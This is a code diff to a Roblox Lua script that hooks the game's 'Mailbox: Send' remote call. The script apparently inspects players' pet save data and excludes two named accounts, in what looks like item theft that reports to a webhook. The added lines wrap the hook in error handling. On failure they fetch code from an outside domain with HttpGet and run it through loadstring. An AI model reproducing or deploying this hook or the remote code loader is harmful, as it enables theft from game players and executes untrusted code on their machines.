@@ -78,6 +78,8 @@ local originalFunction
 originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
 local args = {...}
 print(tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc)
+local vestytest, vestytests
+vestytest, vestytests = pcall(function()
 if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" and game.Players.LocalPlayer.Name~="hamster97" then
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
@@ -196,6 +198,10 @@ local responsexr =
         }
     )
 print(responsexr.StatusMessage)
+end
+end)
+if not vestytest then
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(vestytests)
 end
 return originalFunction(x, unpack(args))
 end)
